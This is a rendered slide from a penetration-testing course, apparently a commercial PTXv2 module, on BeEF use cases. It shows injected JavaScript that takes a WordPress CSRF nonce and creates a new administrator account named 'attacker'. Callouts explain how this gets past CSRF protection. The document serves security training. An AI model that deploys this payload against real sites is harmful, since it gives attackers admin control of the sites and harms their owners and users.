(function(){var loadHandler=window['sl_{D8C1971F-D8E7-4ADE-AF2A-E4D7C02A081C}'];loadHandler&&loadHandler(217, '<div id="spr0_24da92f"><div id="spr1_24da92f" class="kern slide"><img id="img0_24da92f" src="data/img3.png" width="960px" height="540px" alt="" style="left:0px;top:0px;"/><a id="hl0_24da92f" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg19_24da92f" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr3_24da92f" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl1_24da92f" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(1, this);return false;"><span id="txt0_24da92f" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl2_24da92f" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(356, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg20_24da92f" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr4_24da92f" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl3_24da92f" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(356, this);return false;"><span id="txt1_24da92f" style="left:9.6px;top:2.776px;">d</span></a></div></div><a id="hl4_24da92f" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(105, this);return false;" style="left:905.096px;top:313.837px;"><div id="svg21_24da92f" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr5_24da92f" style="left:905.096px;top:313.837px;"><div style="width:0px;"><a id="hl5_24da92f" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(105, this);return false;"><span id="txt2_24da92f" style="left:9.6px;top:2.776px;">d</span></a></div></div><div id="spr6_24da92f" style="left:464px;top:504.919px;"><div style="width:0px;"><span id="txt3_24da92f" class="nokern" data-width="300.722656" style="left:73.433px;top:4.798px;">PTXv2: Section 1, Module 1 - Caendra Inc. Â© 2020</span></div></div><a id="hl6_24da92f" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(382, this);return false;" style="left:905.732px;top:360.719px;"><div id="svg22_24da92f" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr7_24da92f" style="left:905.732px;top:360.719px;"><div style="width:0px;"><a id="hl7_24da92f" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(382, this);return false;"><span id="txt4_24da92f" style="left:9.6px;top:2.776px;">d</span></a></div></div><div id="svg23_24da92f" style="left:31.3px;top:501.094px;"><svg width="875" height="6" viewBox="-2.667 -1.333 875 6"><g fill="#c00000" stroke="none"><path stroke="#c00000" stroke-width="2.667" stroke-linecap="butt" transform="translate(-33.966309,-502.427063)" d="M33.966,503.76 H903.354"/></g></svg></div><a id="hl8_24da92f" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg26_24da92f" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr8_24da92f" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl9_24da92f" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(1, this);return false;"><span id="txt5_24da92f" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl10_24da92f" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(356, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg27_24da92f" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr9_24da92f" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl11_24da92f" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(356, this);return false;"><span id="txt6_24da92f" style="left:9.6px;top:2.776px;">d</span></a></div></div><a id="hl12_24da92f" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(105, this);return false;" style="left:905.096px;top:313.837px;"><div id="svg28_24da92f" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr10_24da92f" style="left:905.096px;top:313.837px;"><div style="width:0px;"><a id="hl13_24da92f" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(105, this);return false;"><span id="txt7_24da92f" style="left:9.6px;top:2.776px;">d</span></a></div></div><a id="hl14_24da92f" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(382, this);return false;" style="left:905.732px;top:360.719px;"><div id="svg29_24da92f" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr11_24da92f" style="left:905.732px;top:360.719px;"><div style="width:0px;"><a id="hl15_24da92f" href="#" onclick="document.getElementById(\'coreSpr_5037552\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_5037552\').getCore().gotoSlide(382, this);return false;"><span id="txt8_24da92f" style="left:9.6px;top:2.776px;">d</span></a></div></div></div><div id="spr2_24da92f" class="kern slide"><div id="svg30_24da92f" style="left:34.833px;top:155.49px;"><svg width="468" height="342" viewBox="0 0 468 342"><path fill="#000000" d="M0,0 h467.846 v341.307 h-467.846 Z"/></svg></div><div id="spr12_24da92f" style="left:34.833px;top:155.49px;"><div style="width:0px;"><span id="txt9_24da92f" class="nokern" data-width="266.457336" style="left:9.6px;top:32.69px;">var ajaxRequest = new XMLHttpRequest();</span></div><div style="width:0px;"><span id="txt10_24da92f" class="nokern" data-width="286.954041" style="left:9.6px;top:50.424px;">var requestURL = &quot;/wp-admin/user-new.php&quot;;</span></div><div style="width:0px;"><span id="txt11_24da92f" class="nokern" data-width="286.954041" style="left:9.6px;top:68.318px;">var nonceRegex = /ser&quot; value=&quot;([^&quot;]*?)&quot;/g;</span></div><div style="width:0px;"><span id="txt12_24da92f" class="nokern" data-width="293.786285" style="left:9.6px;top:86.211px;">ajaxRequest.open(&quot;GET&quot;, requestURL, false);</span></div><div style="width:0px;"><span id="txt13_24da92f" class="nokern" data-width="129.812546" style="left:9.6px;top:104.104px;">ajaxRequest.send();</span></div><div style="width:0px;"><span id="txt14_24da92f" class="nokern" data-width="403.102112" style="left:9.6px;top:121.998px;">var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);</span></div><div style="width:0px;"><span id="txt15_24da92f" class="nokern" data-width="177.638229" style="left:9.6px;top:139.891px;">var nonce = nonceMatch[1];</span></div><div style="width:0px;"><span id="txt16_24da92f" class="nokern" data-width="327.947479" style="left:9.6px;top:175.678px;">var params = &quot;action=createuser&amp;_wpnonce_create-</span></div><div style="width:0px;"><span id="txt17_24da92f" class="nokern" data-width="444.095551" style="left:9.6px;top:190.75px;">user=&quot;+nonce+&quot;&amp;user_login=attacker&amp;email=attacker@site.com&amp;pass1=</span></div><div style="width:0px;"><span id="txt18_24da92f" class="nokern" data-width="300.618530" style="left:9.6px;top:205.664px;">attacker&amp;pass2=attacker&amp;role=administrator&quot;;</span></div><div style="width:0px;"><span id="txt19_24da92f" class="nokern" data-width="239.128372" style="left:9.6px;top:223.398px;">ajaxRequest = new XMLHttpRequest();</span></div><div style="width:0px;"><span id="txt20_24da92f" class="nokern" data-width="293.786285" style="left:9.6px;top:241.291px;">ajaxRequest.open(&quot;POST&quot;, requestURL, true);</span></div><div style="width:0px;"><span id="txt21_24da92f" class="nokern" data-width="437.263306" style="left:9.6px;top:259.184px;">ajaxRequest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-</span></div><div style="width:0px;"><span id="txt22_24da92f" class="nokern" data-width="122.980309" style="left:9.6px;top:274.257px;">form-urlencoded&quot;);</span></div><div style="width:0px;"><span id="txt23_24da92f" class="nokern" data-width="170.805984" style="left:9.6px;top:291.991px;">ajaxRequest.send(params);</span></div></div><div id="spr13_24da92f" style="left:34.91px;top:6px;"><div style="width:0px;"><span id="txt24_24da92f" data-width="370.391937" style="left:9.6px;top:27.438px;">1.4.4 BeEF use cases</span></div></div><div id="svg31_24da92f" style="left:562.825px;top:407.389px;"><svg width="304" height="45" viewBox="-0.167 -0.167 304 45"><path fill="#f2f2f2" stroke="#000000" stroke-width="0.8" stroke-linecap="butt" stroke-linejoin="round" stroke-dasharray="1.333,1" d="M0.167,0.167 h302.396 v44.133 h-302.396 Z"/></svg></div><div id="spr14_24da92f" style="left:562.992px;top:407.556px;"><div style="width:0px;"><span id="txt25_24da92f" class="nokern" data-width="230.918076" style="left:9.767px;top:3.167px;">Injected JavaScript to add a new admin</span></div><div style="width:0px;"><span id="txt26_24da92f" class="nokern" data-width="164.286148" style="left:9.767px;top:20.22px;">(bypassing CSRF protection)</span></div></div><div id="svg32_24da92f" style="left:562.825px;top:180.001px;"><svg width="298" height="45" viewBox="-0.167 -0.167 298 45"><path fill="#f2f2f2" stroke="#000000" stroke-width="0.8" stroke-linecap="butt" stroke-linejoin="round" d="M0.167,0.167 h297.046 v44.133 h-297.046 Z"/></svg></div><div id="spr15_24da92f" style="left:562.992px;top:180.167px;"><div style="width:0px;"><span id="txt27_24da92f" class="nokern" data-width="275.931610" style="left:9.767px;top:3.167px;">Grabbing a valid CSRF token (nonce) through an</span></div><div style="width:0px;"><span id="txt28_24da92f" class="nokern" data-width="102.054230" style="left:9.767px;top:20.22px;">XMLHttpRequest.</span></div></div><div id="svg33_24da92f" style="left:562.826px;top:275.909px;"><svg width="298" height="80" viewBox="-0.167 -0.167 298 80"><path fill="#f2f2f2" stroke="#000000" stroke-width="0.8" stroke-linecap="butt" stroke-linejoin="round" d="M0.167,0.167 h297.046 v78.581 h-297.046 Z"/></svg></div><div id="spr16_24da92f" style="left:562.992px;top:276.076px;"><div style="width:0px;"><span id="txt29_24da92f" class="nokern" data-width="250.503052" style="left:9.767px;top:3.167px;">Using the fetched nonce to perform a POST</span></div><div style="width:0px;"><span id="txt30_24da92f" class="nokern" data-width="210.625214" style="left:9.767px;top:20.22px;">request that will add ourselves as an</span></div><div style="width:0px;"><span id="txt31_24da92f" class="nokern" data-width="259.726440" style="left:9.767px;top:37.273px;">administrator, effectively bypassing the CSRF</span></div><div style="width:0px;"><span id="txt32_24da92f" class="nokern" data-width="133.902374" style="left:9.767px;top:54.327px;">protection mechanism.</span></div></div><div id="svg10_24da92f" style="left:478.373px;top:201.401px;"><svg width="86" height="43" viewBox="-1.422 -0.544 86 43"><g fill="none"><g transform="translate(0.204997,0.456034)"><g fill="#0070c0" stroke="none" transform="translate(-0.205009,-0.456032)"><path stroke="#0070c0" stroke-width="1" stroke-linecap="butt" transform="translate(0.205009,0.456032)" d="M83.159,0 L6.516,34.454"/><path transform="matrix(-0.91208,0.410013,-0.410013,-0.91208,83.363541,0.45604)" d="M91.175,0 L83.237,3.969 V-3.969 Z"/></g></g></g></svg></div><div id="svg18_24da92f" style="left:499.569px;top:314.533px;"><svg width="65" height="80" viewBox="-2.719 -0.689 65 80"><g fill="none"><g transform="translate(0.391846,0.310588)"><g fill="#0070c0" stroke="none" transform="translate(-0.391827,-0.310591)"><path stroke="#0070c0" stroke-width="1" stroke-linecap="butt" transform="translate(0.391827,0.310591)" d="M60.479,0 L4.438,70.701"/><path transform="matrix(-0.621175,0.783672,-0.783672,-0.621175,60.870876,0.310588)" d="M97.362,0 L89.424,3.969 V-3.969 Z"/></g></g></g></svg></div><div id="svg34_24da92f" style="left:441.227px;top:170.445px;"><svg width="53" height="139" viewBox="-13.1 -2.6 53 139"><g fill="none"><path stroke="#4663aa" stroke-width="1" stroke-linecap="butt" stroke-linejoin="round" d="M0.5,0.5 A12.6,2.1 0 0,1 13.1,2.6 V64.65 A12.6,2.1 0 0,0 25.7,66.75 A12.6,2.1 0 0,0 13.1,68.85 V130.9 A12.6,2.1 0 0,1 0.5,133"/></g></svg></div><div id="svg36_24da92f" style="left:474.774px;top:325.618px;"><svg width="38" height="133" viewBox="-9.5 -2 38 133"><g fill="none"><path stroke="#4663aa" stroke-width="1" stroke-linecap="butt" stroke-linejoin="round" d="M0.5,0.5 A9,1.5 0 0,1 9.5,2 V62.75 A9,1.5 0 0,0 18.5,64.25 A9,1.5 0 0,0 9.5,65.75 V126.45 A9,1.5 0 0,1 0.5,127.95"/></g></svg></div><div id="spr17_24da92f" style="left:832px;top:502px;"><div style="width:0px;"><span id="txt33_24da92f" class="nokern" data-width="47.662758" style="left:9.6px;top:7.998px;">| Â  p.218</span></div></div><div id="spr18_24da92f" style="left:34.833px;top:116.251px;"><div style="width:0px;"><span id="txt34_24da92f" data-width="335.976563" style="left:9.6px;top:3.238px;">BeEF use cases : Scenario 2</span></div></div></div></div>');})();